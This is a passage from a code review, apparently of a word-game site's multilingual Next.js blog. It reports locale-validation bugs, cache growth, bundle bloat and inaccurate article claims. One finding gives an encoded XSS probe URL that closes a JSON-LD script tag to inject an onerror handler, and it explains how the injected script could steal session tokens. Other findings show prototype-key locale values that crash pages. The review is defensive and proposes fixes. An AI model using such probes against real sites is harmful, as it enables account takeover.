The previous pass noted unvalidated locales as an SEO or canonical issue (Shard 36 #2, Shard 37 #4, Shard 41 #5). It did not cover the prototype-key crash or the `in` false positive. The same unvalidated param also reaches `BreadcrumbJsonLd` URLs (`best-boggle-alternatives-2026/page.tsx:70-72`), which ties into Shard 26's JSON-LD escaping concern.

**Fix:**
- Add one shared `resolveLocale(raw)` helper. It should return a member of `SUPPORTED_LOCALES` or call `notFound()`.
- Use `Object.hasOwn(map, locale)` instead of `locale in map` for any record lookup.
- Better still, put the check in the `[locale]` layout, so it runs once for every route.

## 2. ISR cache grows without bound on arbitrary locale segments
**Severity:** Medium. This is the one that breaks at 10x.

**Where:** `revalidate = 86400` at:
- `best-boggle-alternatives-2026/page.tsx:8`
- `boggle-vs-scrabble/page.tsx:12`
- `boggle-vs-wordle/page.tsx:8`
- `boggle-vs-words-with-friends/page.tsx:8`
- `daily-challenge-strategies/page.tsx:7`

None of these pages has `generateStaticParams` or `dynamicParams = false`. The help pages do (Shard 41 #4).

**Failure scenario:**
1. Any unknown locale segment, such as `/xx`, `/en-GB` or `/aaaa1`, falls back to English and renders successfully.
2. Each distinct segment is rendered on demand and cached for 24 hours as its own ISR entry.
3. A crawler following malformed hreflang links, or one person running a loop, can create one cache entry per article for every random string.
4. On self-hosted Node, that fills the `.next/cache` disk and burns CPU on the same box that serves the game sockets. On Vercel, it bills ISR writes.
5. As you add articles, the attack surface multiplies by the article count. The blog layout's ItemList links all 26 articles in every locale (Shard 31 #5), so one bad entry point fans out quickly.

**Fix:**
- Add `export const dynamicParams = false` plus `generateStaticParams` over `SUPPORTED_LOCALES`, ideally in the `[locale]` layout.
- With that in place, unknown locales 404 before they are rendered or cached. This also closes finding 1.

## 3. Every article ships all six locales' full text in its client JS, and theming is computed in JS during SSR
**Severity:** Low–medium. It costs performance and revenue on your ad and SEO pages, and it scales linearly with locales times articles.

**Where:**
- Each `PageClient.tsx:1` declares `'use client'`.
- Each `PageClient.tsx:15` imports `./content`.
- Theme classes are chosen in JS at `PageClient.tsx:20-23, 47-52` and throughout the file.

**Failure scenario:**
1. Because `PageClient` is a client component that imports `contentByLocale`, the bundler puts every locale's article into that page's JS chunk. For example, `boggle-vs-scrabble/content.ts` is about 600 lines of prose across five or more locales.
2. A visitor reading Hebrew downloads and parses the English, Swedish, Japanese and Spanish articles too.
3. The visible text is already in the SSR HTML, so the active locale is effectively sent twice.
4. These are the pages carrying `InlineBannerAd` and competing for organic traffic. Extra JS hurts LCP and INP, which affects both ranking and ad viewability.
5. Separately, `isDarkMode` comes from `useTheme()`. If the server renders the default theme and the client reads a stored theme, the `className` attributes mismatch at hydration.
6. React does not guarantee it will patch attribute mismatches, so a dark-mode user can be left with light-mode classes. Whether this happens depends on `ThemeContext`, which I couldn't see.

**Fix:**
- Make the article body a server component that receives `content` as a prop.
- Keep only small client islands, such as the theme toggle and the ads.
- Replace JS-computed theme classes with Tailwind `dark:` variants driven by a class on `<html>`. That removes both the bundle cost and the hydration risk.
- Doing this once in a shared `BlogArticleLayout` also removes about 175 duplicated lines per article.

## 4. Factual claims about named competitors, published by a competitor, including in FAQPage structured data
**Severity:** Medium business and legal risk. This is not cosmetic, because it is comparative advertising about specific products.

**Where:**
- `best-boggle-alternatives-2026/faq.ts:17`, along with the he, sv and ja versions at `:40, :63, :86`. These say "Thousands of 1-star reviews cite it as 'great game ruined by monetization.'" This text is emitted as FAQPage JSON-LD at `page.tsx:53-64, 85-88`.
- `boggle-vs-words-with-friends/content.ts:77-81`:
  - It names three WWF features ("Word Radar", "Swap+", "Hindsight") as "All purchasable".
  - It gives a "$4.99" price.
  - It puts App Store reviews in quotation marks with no source.
- The Hebrew, Swedish, Japanese and Spanish versions of that file (`:190`, `:305`, `:417`, `:529`) repeat the claim with localized prices.
- `boggle-vs-wordle/content.ts:192` (and the matching sv, ja and es lines) says "Zynga buried it under pay-to-win power-ups".
- **The site contradicts itself:**
  - `faq.ts:17` says Boggle With Friends "is still available".
  - `boggle-vs-scrabble/content.ts:96` says it "existed and then kind of didn't".

**Failure scenario:**
1. LexiClash competes directly with these apps.
2. A rights holder (Zynga/Take-Two, Hasbro, Scopely) or a journalist checks the quoted reviews, the price and the feature list.
3. Anything inaccurate is a false-advertising claim about a competitor's product. It is amplified because you push it into search rich results as structured data.
4. The two pages contradicting each other weakens any "honest review" defence.
5. This matters most right before you start taking money and applying to ad networks.

**Fix:**
- Remove quoted "reviews" that you can't link to.
- Drop specific prices and feature-purchase claims, or link each one to the competitor's own store listing.
- Make the Boggle With Friends status consistent across pages.
- Keep competitor statements out of FAQPage JSON-LD altogether. Say what LexiClash does rather than what the others do.

### Related, lower priority
`best-boggle-alternatives-2026/faq.ts` has no `es` or `ru` entries. `page.tsx:45` falls back to English, so `/es/...`, which has a Spanish title (`page.tsx:23`) and a Spanish FAQ heading (`faq.ts:109`), emits English FAQPage markup. Google's policy requires structured data to match the visible content. Add `es`, or emit no FAQ schema when the locale has no FAQ.

---

**Checked and clean in this batch:**
- `JSON.stringify` of `faqSchema` (`best-boggle-alternatives-2026/page.tsx:87`) only touches static constants today.
- These files contain no secrets, no fetches, no writes, and no auth paths.

## Shard 33

# Review: blog slice, items the previous pass missed

**Scope.** These files are static blog content, plus one shared `blog/layout.tsx`. There is no billing, auth, or write path here. The previous pass already logged the content defects in this slice: the future dates (`2026-09-12`, `2026-09-29`), the missing `ru` related-heading, the date formatted with `language` instead of `locale`, the duplicate BreadcrumbList, the ItemList that includes noindex posts, the "five languages" error in the Russian copy, and the Hebrew copy quality. I don't repeat those.

What's left is one trust-boundary problem that the previous pass treated as "probably fine" each time it saw it, and two architecture problems that cause most of the per-file symptoms it reported. They're ordered by severity, and there are five.

---

## 1. The `[locale]` URL segment is written into raw `<script>` JSON-LD, and the code comment says it isn't user input

**Where:**
- `fe-next/app/[locale]/blog/layout.tsx:87-88`. The raw `locale` becomes `localePath`.
- `layout.tsx:98, 104, 151`. That value is interpolated into the schema objects.
- `layout.tsx:157-164`. The schema is output with `dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }}`.
- `layout.tsx:140`. The comment there reads "Safe: all content is from static article metadata, not user input". That's wrong: `localePath` comes from the URL.
- Every article page sends the same raw value into `<BreadcrumbJsonLd>`. Examples: `death-of-turn-based-word-games/page.tsx:50-54` and `free-word-games-online/page.tsx:53-57`.

**Failure scenario:**
1. An attacker builds a link like `https://www.lexiclash.live/%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3D...%3E/blog`.
2. The App Router hands the decoded segment to `params.locale`.
3. `JSON.stringify` escapes quotes but not `<`, so `</script>` closes the JSON-LD block. The `<img onerror>` then runs on the `lexiclash.live` origin.
4. Supabase's browser client keeps the session in `localStorage`. The script can read the access and refresh tokens and send them out. For a teacher or the admin, that's account takeover. The bearer-only admin routes from the earlier shards accept exactly that token.
5. The article routes use ISR (`revalidate = 86400`). If the poisoned URL gets rendered and cached, it keeps serving the payload to anyone who opens that link.

**What it depends on:** whether `proxy.ts` or `app/[locale]/layout.tsx` rejects unknown locales. Neither is in this slice. The previous pass raised the same question for the about and anagram pages and left it as "confirm". It didn't notice that the blog layout wraps every article and puts this on dozens of URLs.

**Verify in 30 seconds:** request the URL above and look for a literal `</script><img` in the HTML.

**Severity:** High if the probe reflects the payload. Low if the proxy already returns 404 for unknown locales.

**Fix. Do both; each one alone leaves gaps:**
- In `app/[locale]/layout.tsx`, add `export const dynamicParams = false` next to `generateStaticParams()` that returns the six locales. Also add `if (!LOCALES.includes(locale)) notFound()`.
- Route every JSON-LD emit through one serializer and remove the scattered `JSON.stringify` calls:
  ```ts
  export const toJsonLd = (o: unknown) =>
    JSON.stringify(o).replace(/</g, '\\u003c').replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029');
  ```
- Delete the misleading comment at `:140`.

---

## 2. Prototype-key lookups crash every article for locales like `constructor`, `__proto__` or `toString`

**Where:**
- `death-of-turn-based-word-games/page.tsx:36, 39, 44, 47`
- `free-word-games-online/page.tsx:30, 40-41, 47, 50`
- `hebrew-word-games-guide/page.tsx:35, 38, 43`
- Every `PageClient.tsx:25, 33`. For example, `contentByLocale[locale] || contentByLocale.en` and `relatedHeadingByLocale[locale] || ...`.

**Failure scenario** (`/constructor/blog/death-of-turn-based-word-games`):
1. `locale in metaTitles` follows the prototype chain, so `'constructor' in metaTitles` is true. `hasTranslation` becomes true.
2. `metaTitles['constructor']` is the `Object` function. It's truthy, so the `|| metaTitles.en` fallback never runs, and `generateBlogMetadata` receives a function as `title`.
3. `contentByLocale['constructor']` is also `Object`. `content.sections` is `undefined`, so `extractFaqFromSections(undefined)` throws and the server render returns a 500.
4. The client has the same problem: `content.sections.map` crashes. `relatedHeading` is a function, which React refuses to render.
5. Any crawler, scanner or bot probing common prototype keys gets a 500 on every blog post. Each of those requests runs a full server render, because errors aren't cached.

**Why the previous pass missed it:** it handled "unknown locale falls back to English" as an SEO cosmetic issue. Prototype keys are the case where the fallback doesn't happen.

**Severity:** Medium. Anyone can trigger it, and it affects every post. Finding 1's `dynamicParams = false` also fixes it.

**Fix:** Add one helper and use it everywhere a URL locale indexes a `Record`:
```ts
export const pickLocale = <T,>(m: Record<string, T>, k: string, fallback: T): T =>
  Object.hasOwn(m, k) ? m[k] : fallback;
```
Replace `hasTranslation: locale in metaTitles` with `Object.hasOwn(metaTitles, locale)`.

---

## 3. Each article is a `'use client'` component that ships every locale's full text to the browser

**Where:**
- `death-of-turn-based-word-games/PageClient.tsx:1, 15, 25`
- `free-word-games-online/PageClient.tsx:1, 15`
- `hebrew-word-games-guide/PageClient.tsx:1, 15`
- `juegos-palabras-gratis/PageClient.tsx:1, 15`
- `leaderboard-elo-explained/PageClient.tsx:1, 15`
- The same pattern in every other post.

**Failure scenario:**
1. `import { contentByLocale } from './content'` inside a client component pulls the whole map into that route's JS chunk. For `death-of-turn-based-word-games` that's five full articles in en, he, sv, ja and es, about 475 lines of long multi-byte strings. A visitor needs only one.
2. The server HTML already contains the rendered text. The browser then downloads, parses and hydrates the same prose again, plus four languages nobody reads.
3. These pages exist to earn search traffic and ad revenue, and both have two `InlineBannerAd` slots. Extra JS hurts INP and LCP on mid-range Android phones. Core Web Vitals feed search ranking and ad viewability, which feeds RPM.
4. The cost scales with posts × locales. A 10x increase in posts or a seventh locale makes it worse on every page.

**Why it's client-side at all:** for `useTheme()` (to choose dark or light classes), `useParams()` and `useLanguage()`. None of those needs the article body on the client.

**Severity:** Medium. It's a revenue-adjacent performance cost that grows with the content.

**Fix:**
- Make the article page a server component.
- Pick `content` for the validated locale on the server.
- Render the body as plain server HTML.
- Use Tailwind `dark:` variants keyed on the theme class instead of `isDarkMode ? … : …`. Then nothing in the body needs JS.
- If something must stay interactive, pass it only the current locale's strings as props.

---

## 4. Around 28 hand-copied article shells; each recurring bug from the previous pass is one bug copied many times

**Where:**
- Compare `death-of-turn-based-word-games/PageClient.tsx`, `free-word-games-online/PageClient.tsx`, `juegos-palabras-gratis/PageClient.tsx`, `hebrew-word-games-guide/PageClient.tsx` and `leaderboard-elo-explained/PageClient.tsx`. They're near-identical 175-190-line files.
- Each one has its own `relatedHeadingByLocale` (lines 26-32 or 27-33), its own hard-coded publish date (`:97`, `:105` or `:107`), and its own related-articles list.
- `blog/layout.tsx:109-138` keeps a fourth independent registry of slugs and titles.

**Failure scenario at 10x:**
1. The previous pass reported the same defects file by file in at least six shards: missing `ru` heading, date formatted with `language`, visible date drifting from the JSON-LD date, English-only related titles, stale related lists, and the truncated ItemList title at `layout.tsx:126` ("…And It").
2. Those aren't separate bugs. There's no single source of truth for post metadata.
3. Adding a seventh locale means editing every `PageClient`, every `page.tsx` meta map and the layout. Missing one file silently gives that locale English, or crashes it as in finding 2.
4. At 10x posts, the layout ItemList, sitemap, related lists and hreflang will drift apart. That's the SEO surface you depend on for top-of-funnel traffic.

**Severity:** Medium as architecture debt. It isn't a crash today, but it produces most of the blog bugs already on the list.

**Fix:**
- Create one `blog/registry.ts`: `{ slug, datePublished, dateModified, locales: Locale[], category, titleByLocale }[]`.
- Create one `<ArticleShell content locale post />` server component that owns the header, date, ads, CTAs and related list.
- Make each post folder only `content.ts` plus a small `page.tsx`.
- Generate the layout ItemList, `hasTranslation`, the related lists and the sitemap from the registry.
- Fix findings 1-3 once in the shell.

---

## 5. The blog's own "honest" buyer checklists describe a product LexiClash may not be (unverified, trust and revenue)

**Where:**
- `free-word-games-online/content.ts:44` describes the "honest model" as a banner plus a one-time payment to remove ads. The earlier pass found the "Remove ads" option is a fake door (`RemoveAdsProbe.tsx:28-32`).
- `free-word-games-online/content.ts:90, 96` says LexiClash "work[s] offline once loaded" as a PWA. Teacher pages say the games need internet.
- `juegos-palabras-gratis/content.ts:49, 105` says any game that accepts AVION for AVIÓN, or MANANA for MAÑANA, "didn't think about Spanish". It then sends readers to LexiClash's Spanish daily game (`:59`). Grid games usually fold diacritics, and the earlier pass found `normEs` normalisation in the dictionary pipeline.

**Failure scenario:**
1. A reader applies the article's checklist to LexiClash.
2. They find there's no way to pay to remove ads, it doesn't work offline, or the Spanish game accepts unaccented words.
3. The article has just taught them to call that a red flag. Your highest-intent content then argues against your own product.

**Severity:** Low to medium. It's a business trust issue, not a code fault. Each point is a quick check against the product.

**Fix:**
- Test these three claims in the live app: whether ads can be removed, whether it works offline, and how accents are handled.
- For each claim that turns out false, either edit the claim or change the product. The cheapest change is to make the remove-ads option a real one-time purchase. That is also a first-revenue path.

---

**Bottom line for this slice:** finding 1 is the only one that could be severe. Run the curl probe first. If it reflects the payload, ship `dynamicParams = false` and the `toJsonLd` serializer the same day. Those two changes also close finding 2 and the "unvalidated locale" items the previous pass left open in shards 26, 27, 37 and 41.

## Shard 34

# Review: blog content slice (leaderboard-elo, milat-hayom, mishachke, most-popular, multilingual, multiplayer ×2, netflix)

**Bottom line:** this slice has no authorization, injection, secrets, trust-boundary or concurrency surface. Every file is static content, a server wrapper, or a client renderer. The JSON-LD is built from constants plus the route `locale`. I found seven issues the previous pass missed:

- One is an architecture problem that grows linearly with locales.
- One is a design flaw where the copy claims to be "from the code" but has no link to the code.
- The rest are correctness, SEO and credibility issues.

Nothing here blocks first revenue. Findings 1 and 2 are the ones that get worse at 10x.

---

## 1. Every blog page ships all locales' article text in its client JS bundle
**`most-popular-word-games-2026/PageClient.tsx:14-15, 25-27`**. The same pattern appears in every PageClient here (`milat-hayom-habit/PageClient.tsx:15`, `multiplayer-strategy-guide/PageClient.tsx:15`, `netflix-word-game-2026-rise/PageClient.tsx:14`, and others).

**Severity:** medium (performance, Core Web Vitals, and therefore ad RPM and SEO).

**Failure scenario:**
1. `PageClient` is `'use client'` and imports `contentByLocale` and `faqByLocale` as modules.
2. Next bundles those modules, all locales included, into the route's client chunk.
3. For `most-popular`, that means about 590 lines of long-form prose in 5 languages, plus `faq.ts`. A visitor needs only one-fifth of it.
4. The server has already rendered the same text to HTML, so the browser downloads it twice: once as HTML and once as JS it must parse before hydration.
5. At 10x locales or articles, each page's JS grows in step. These are the ad-inventory pages, so the slower LCP and TBT cost both rankings and ad revenue.

**Fix:**
- Move content selection into `page.tsx`, which already does `contentByLocale[locale]` at line 53.
- Pass only `content` and `faqs` as props to a client shell. The client shell needs only theme and date handling.
- Better still, make the article body a server component.
- Run `@next/bundle-analyzer` once to confirm the size before and after.

## 2. Rating, scoring and game-rule numbers are hard-coded in copy and FAQ JSON-LD, labelled "straight from the code"
**Where:**
- `leaderboard-elo-explained/content.ts:32-34, 42, 68`, plus the FAQ JSON-LD at `page.tsx:54-71`.
- `multiplayer-strategy-guide/content.ts:34` (says shared words give "both get credit"), `:44` (the 10/20/50/100/200/500 length table), and `:72` (fire rounds double the score).

**Severity:** medium-low. This is integrity of public claims, and it drifts silently.

**Failure scenario:**
1. You tune `K`, the RD floor, a tier cutoff, or the length-score table in the rating or scoring module.
2. Nothing connects those constants to the articles, so the blog keeps publishing the old numbers.
3. The FAQPage structured data repeats them to Google and AI answer engines, under the explicit claim "exact cutoffs, straight from the code".
4. Ranked players compare the article to their actual rating moves and conclude the system is rigged. That is the exact complaint the article was written to defuse.

**Internal inconsistency to fix too:**
- Line 42 says high RD amplifies swings.
- The formula at :50-52 is plain `K·(S−E)` with no RD term.
- Line 86 says a loss costs "at most one K-factor".

If RD actually scales the update, the line 86 bound is false. If RD does not scale it, the line 42 claim is false.

**Fix:**
- Import the constants (K schedule, RD bounds, tier table, `scoreForLength`) into `content.ts` and the FAQ, and interpolate them.
- Add a unit test that asserts the copy matches the module.
- Correct whichever of lines 42 and 86 doesn't match the real update.

## 3. Hebrew-only articles render left-to-right and are served as duplicates under every locale
**`milat-hayom-habit/PageClient.tsx:25, 55`, `mishachke-milim-chinuch/PageClient.tsx:25, 55`**

**Severity:** low-medium.

**Failure scenario:**
1. A user or crawler reaches `/en/blog/milat-hayom-habit`. The previous pass found that the layout ItemList lists every slug in every locale.
2. `contentByLocale.en` is undefined, so the page falls back to Hebrew.
3. The page sits inside the `/en` layout, which presumably sets `dir="ltr"`, and `<article>` sets no `dir` or `lang`.
4. The Hebrew body renders left-to-right. Punctuation and mixed Latin text (Wordle, RTL, spaced repetition) land on the wrong side.
5. The same document also exists at `/sv`, `/ja`, `/es` and `/ru`. The pages are noindexed, but crawlers still fetch them.

**Fix:**
- In `page.tsx`, if `locale !== 'he'`, call `permanentRedirect('/he/blog/<slug>')`. That removes both the duplicates and the direction bug.
- At minimum, add `dir="rtl" lang="he"` to `<article>` when the content is the Hebrew fallback.

## 4. FAQPage JSON-LD is heuristically extracted from prose that isn't an FAQ (conditional)
**`milat-hayom-habit/page.tsx:47, 62`, `mishachke-milim-chinuch/page.tsx:47, 62`**

**Severity:** low, and conditional on how `parseFaqProse` works. I couldn't see it.

**Failure scenario:**
1. `extractFaqFromSections` runs over essay prose.
2. Paragraphs end in rhetorical questions, for example "אבל זה כן עובד. למה?" at `mishachke/content.ts:46`. Its "answer" is in the next section.
3. If the parser keys on `?`, it emits FAQ entries with no visible matching FAQ block on the page.
4. Google treats FAQ markup that isn't backed by visible content as a structured-data violation and can drop rich results site-wide for that template.

**Fix:**
- Give these articles explicit `faq` arrays rendered visibly, as `most-popular` does at `PageClient.tsx:164-201`.
- Or pass no `faqItems` at all.

## 5. The locale → multiplayer-landing map is copy-pasted across files and sends `ru` to English
**`most-popular-word-games-2026/PageClient.tsx:220-230`, `netflix-word-game-2026-rise/PageClient.tsx:177-187`, `multiplayer-word-games-social/PageClient.tsx:182-192`**

**Severity:** low, on a conversion CTA.

**Failure scenario:**
1. The same nested ternary is duplicated in three or more files.
2. `ru` (a supported locale) falls through to `/en/free-multiplayer-word-game`.
3. When a new landing page ships, each copy has to be found and edited by hand, and one will be missed.

**Fix:**
- Create one `multiplayerLandingFor(locale)` helper in `lib/i18n`, with an explicit `ru` entry or a deliberate fallback.
- Use it in all three files.

## 6. Likely-false facts in these articles that the previous pass did not list
**Severity:** low-medium for credibility. The first item sits next to FAQ structured data.

- **`most-popular-word-games-2026/content.ts:87`** (repeated in he :185, sv :302, ja :419, es :536): "Words With Friends has crossed 6 billion lifetime downloads." That is close to one per smartphone on earth and is almost certainly a confusion with games played. The he, sv, ja and es versions also add an unsourced TV-show adaptation.
- **`milat-hayom-habit/content.ts:60`**: says Duolingo users on a 7-day streak are "פי שבעה" (7×) more likely to stay. My recollection is that Duolingo's published figure is about 3.6×. Check it.
- **`milat-hayom-habit/content.ts:72`**: says the shortest Hebrew word is "usually three letters". That's wrong: של, את, זה and לא are common two-letter words. Native readers will notice.
- **`milat-hayom-habit/content.ts:38-40`**: says "for his wife" (other articles say partner) and "sold within half a year" (it was about 3 months, Oct 2021 → Jan 2022).

**Fix:** correct each figure or cut it, in every locale.

## 7. Copy and UI defects in the Hebrew articles
**Severity:** low.

- **`milat-hayom-habit/content.ts`**:
  - `:34` says "כשמתפתח רגל קטן" and should be "הרגל".
  - `:74` "ופיהוק שאתה תקרא אותו" is garbled.
  - "הוקאבולרי" at `:52, :64, :82` should be "אוצר המילים".
- **Author persona:** both articles use "נרד המילים" (`milat:26`, `mishachke:26`), while other posts use "חנון המילים". In practice `content.authorName` and `content.authorBio` are never rendered, because `<AuthorBioCard />` takes no props. So these fields, including the "247-day streak" bio, are dead data.
- **`milat-hayom-habit/PageClient.tsx:156-158`**: the "התחל לתרגל" ("Start practicing") button links to `/leaderboard`. Either point it at `/singleplayer` or relabel it.

---

## Already-reported patterns that also apply here (not counted)
- **Japanese `wordCount`:** `most-popular-word-games-2026/page.tsx:56-59` has the same `split(/\s+/)` undercount for `ja` that was flagged on the best-boggle-alternatives page.
- **Missing `ru` related-articles heading:** `multilingual-word-learning/PageClient.tsx:27-33` and `multiplayer-word-games-social/PageClient.tsx:27-33` have no `ru` entry, even though both pages set `ruTranslated`.
- **Resolved:** the previous pass asked to confirm that `leaderboard-elo-explained` exists, because `multiplayer-strategy-guide/PageClient.tsx:41` links to it. It does.
- **Resolved:** the previous pass worried that the `most-popular` FAQ isn't visibly rendered. It is, at `PageClient.tsx:164-201`. The real problem remains that the English body lacks the Strands and Netflix sections.

## Shard 35

# Review: blog slice (netflix, ordspel-familjer, science, spelling-bee, top-player-secrets, vocabulary, blog index)

## Scope

These files are static article content and thin page wrappers. They have no authz, secrets, writes, or concurrency, so the security categories you listed mostly don't apply. Only finding 1 touches them, and it is conditional.

What these files do show is two design problems that grow with every post and locale (findings 1 and 2). They also contain legal and AdSense risks the previous pass didn't raise (findings 3–5). I've skipped everything that pass already reported:
- Brooklyn vs Wales
- `ru` missing from `SAFE_LOCALES`
- hard-coded dates and the `language`/`locale` mix-up
- the related-articles maps
- the sertraline, UNGEFÄR and Cepeda errors
- the spelling-bee citations and future date
- the read-time and author drift

---

## 1. Locale lookups match prototype keys, and ISR may cache every junk locale
**Severity:** Medium if middleware or the layout doesn't whitelist locales; nothing otherwise.

**Where:**
- `netflix-word-game-2026-rise/page.tsx:36,46,52-57`
- `vocabulary-building-strategies/page.tsx:37,40,45`
- `top-player-secrets/page.tsx:37,40,45`
- `science-behind-word-games/page.tsx:37,40,45`
- `ordspel-familjer/page.tsx:28,44`
- each `PageClient.tsx:25`, which runs `contentByLocale[locale] || …`

**Failure scenario:**
1. Someone requests `/constructor/blog/netflix-word-game-2026-rise`, or uses `__proto__`, `toString` or `valueOf` as the locale.
2. `contentByLocale['constructor']` returns the `Object` function. That value is truthy, so the `|| contentByLocale.en` fallback never runs.
3. `content.sections.reduce` (netflix `page.tsx:54`) throws, and the response is a 500.
4. In `generateMetadata`, `'constructor' in metaTitles` is `true`, so the page claims a translation exists. `title` becomes a function, which renders as `function Object() { [native code] }` if it reaches `<title>`.
5. Every page sets `revalidate = 86400` and none defines `generateStaticParams`. Next renders any `[locale]` value on demand and caches the result, so `/aaaa1/…`, `/aaaa2/…` and so on each create a new ISR entry. Nothing bounds the cache, and the entries carry indexable canonicals. The previous pass flagged unvalidated locales only as a 404-vs-500 issue. This is the version that matters at scale.

**Fix:**
- Check `app/[locale]/layout.tsx` first. If it has `generateStaticParams` over `LOCALES` and `export const dynamicParams = false`, this finding is moot.
- If it doesn't, add both there. That is a single change for the whole site.
- Also replace the `in` checks and bare indexing with `Object.hasOwn(map, locale)`.

## 2. Each article ships every locale's full text in the client JS, plus a ~190-line copied shell
**Severity:** Medium for architecture and performance; it grows linearly with posts × locales.

**Where:**
- `vocabulary-building-strategies/PageClient.tsx:1,15,25`, which is `'use client'` and imports `./content`. That file has 731 lines of prose in 6 scripts.
- The same pattern appears in `science-behind-word-games/PageClient.tsx:15`, `top-player-secrets/PageClient.tsx:15`, `ordspel-familjer/PageClient.tsx:15` and `spelling-bee-science-vocabulary/PageClient.tsx:13`.

**Failure scenario:**
1. A reader opens the English article.
2. The HTML contains the English text. The client bundle also contains the en, he, sv, ja, es and ru text, because `contentByLocale` is imported into a client component. For the vocabulary post that is on the order of 100 KB of raw UTF-8 that never renders.
3. Each new post or locale adds to this. On ad-supported pages, that weight hurts LCP and INP, which your web-vitals admin page is tracking.
4. The theme comes from client context (`useTheme`, at `isDarkMode` on line 23). Server output and first client render can therefore disagree, which risks a flash or a hydration warning (unverified).
5. Every post is a hand copy of the same shell. That copying is why the previous pass kept finding drift in dates, heading maps, related lists and `ru` gaps. More posts means more drift.

**Fix:**
- Make one server component, `BlogArticle`, driven by a post registry with slug, dates, locales and related slugs.
- Pass only `contentByLocale[locale]` to it as a prop.
- Use Tailwind `dark:` variants instead of `isDarkMode`, so most of the tree needs no client JS.
- Keep the ad and CTA pieces as small client islands.

## 3. Trademark and affiliation misrepresentation on the Spanish Netflix page
**Severity:** Medium (legal).

**Where:**
- `netflix-word-game-2026-rise/content.ts:534`: `playMultiplayer: 'Jugar Scrabble Online en Español'`
- `page.tsx:23,31`: the `es` title and description promise "Qué Es y Dónde Jugar Gratis" and "cómo funciona"
- `page.tsx:78`: the keywords include "netflix wordle"

**Failure scenario:**
1. A Spanish user searches "juego de palabras netflix" and lands on this page, expecting to learn where to play Netflix's game.
2. The article never says how Netflix's game works or where to play it.
3. The CTA offers "Play Scrabble Online in Spanish" and opens LexiClash multiplayer, which is not Scrabble.
4. Using another company's mark as the label for your own product is the classic infringement pattern. Scrabble is a Hasbro or Mattel mark depending on region, and the Scrabulous takedown was this exact case. A takedown or cease-and-desist letter is cheap for them to send and expensive for a solo founder to answer.
5. Separately, the whole English headline rests on "Netflix just dropped a word game". Confirm that event happened before more SEO depends on it.

**Fix:**
- Change the CTA to "Jugar en línea en español".
- Rewrite the `es` title and description so they match the article.
- Use third-party marks only in comparative statements. Never use them as your own button labels.

## 4. The Swedish family article tells readers to avoid what LexiClash is, then links to it
**Severity:** Medium for business and trust.

**Where:**
- `ordspel-familjer/content.ts:77` says to avoid games with push notifications.
- `:79` says to avoid games played on separate devices at the same time.
- `:81` says an app that requires an account or has premium features "is not a family game".
- `PageClient.tsx:156-158` puts the "Spela Tillsammans" CTA on `/multiplayer`, which is per-device real-time play.

**Failure scenario:**
1. A Swedish parent reads the checklist and clicks through.
2. They find:
   - a push prompt (`PushNotificationPrompt` exists in the repo)
   - account and signup prompts
   - Teacher Pro upsells
   - a multiplayer game where each person uses their own device
3. The article has disqualified the product in its own words.
4. Lines 95–101 also say an app that folds å/ä/ö, or doesn't use SAOL, should be "set aside". The previous pass found that `normalizeWord` folds Hebrew final letters. If the Swedish path folds diacritics the same way, the article is describing LexiClash as a bad app.

**Fix:**
- Either reword the checklist to match what you ship, or point the CTA at the single-screen daily puzzle and drop the account and premium line.
- Check how the `sv` normalizer handles å, ä and ö before keeping lines 95–101.

## 5. Three ad units on translations of about 200 words, all marked as translated
**Severity:** Medium (AdSense approval and revenue).

**Where:**
- `spelling-bee-science-vocabulary/PageClient.tsx:102,129,166` places three `InlineBannerAd`s: after the header, after section index 2, and at the end.
- `content.ts:84-105` (he), `118-139` (sv), `152-173` (ja) and `186-207` (es) are each four short paragraphs.
- `page.tsx:45` sets `hasTranslation: locale in metaTitles`, so all four are presented as full translations.

**Failure scenario:**
1. The AdSense reviewer or crawler opens `/he/blog/spelling-bee-science-vocabulary`.
2. The page has a few hundred words and three ad slots.
3. That is the "more ads than content / low-value content" pattern AdSense rejects.
4. The site is already waiting on AdSense review, so these thin pages count against the whole domain.

**Fix:**
- In the shared article shell from finding 2, gate ad count on word count. For example, allow no mid-article ad under about 600 words.
- Set `hasTranslation` only for locales whose sections are actually full. Better, compute it as true only when a locale has as many sections as `en`.

## 6. Wrong facts about a named minor in the spelling-bee article
**Severity:** Low–Medium (credibility with teachers, who are your buyer).

**Where:**
- `spelling-bee-science-vocabulary/content.ts:21,28` (en)
- repeated at `:79,86` (he), `:113,120` (sv), `:147,154` (ja) and `:181,188` (es)

**Failure scenario:**
1. The page says Bruhat Soma was 14 when he won in 2024 and spelled "absorptivity" and "wunderkind".
2. My recollection is that he was 12 and won a spell-off with the word "abseil". Please verify.
3. A teacher who followed the bee spots the error in the opening line of a page that is meant to establish authority.
4. The subtitle also says he "just won", while the post is dated 2026.

**Fix:** Correct the age and the words in all five locales, and drop "just".

## 7. The vocabulary article promises "full citations so you can fact-check", and several are wrong
**Severity:** Low–Medium. These claims are copied into all six locales.

**Where:** `vocabulary-building-strategies/content.ts`:
- `:38` makes the promise. `page.tsx:55-62` passes no `citations` at all.
- `:62` says Karpicke & Roediger 2008 found "80% better retention". As I recall, about 80% was the recall *level* in the repeated-retrieval condition, not an 80% improvement.
- `:112` cites Mueller & Oppenheimer 2014 for "motor memory traces". That paper compares laptop and longhand note-taking for conceptual understanding.
- `:92` says Adesope 2010 shows bilinguals have larger vocabularies "even in their native language". That meta-analysis is about cognitive correlates, and the usual finding is *smaller* vocabulary per language.
- `:94` says "CORAZÓN → CORONARY through Latin". *Coronary* comes from *corona* (crown), not *cor*.

**Fix:** Correct or remove each claim, then add real `citations` to the JSON-LD, as `science-behind-word-games/page.tsx:62-83` already does.

## 8. A first-person family memoir under your real name, with internal contradictions
**Severity:** Low–Medium (E-E-A-T and trust).

**Where:** `ordspel-familjer/content.ts:27-31,57,63,67`. The article describes:
- a wife who teaches languages
- children aged 9 and 6
- a mother aged 71 in Göteborg
- reading DN over Sunday coffee

**Failure scenario:**
1. Your other articles present Ohad as an Israeli developer writing native Hebrew (for example netflix `content.ts:129-138`).
2. This one describes a Swedish household under the same name.
3. It also contradicts itself:
   - `:43` mentions "farmor är 78"
   - `:67` says "min mor är 71"
   - `:69` refers to "ringa morfar", who never appears
   - `:81` mentions a "75-årig mor"
4. Google's helpful-content guidance targets invented first-hand experience, and anyone who knows you will notice.

**Fix:** Rewrite it as a guide in the second person, or attribute it to a real Swedish contributor.

---

## Correction to the previous pass
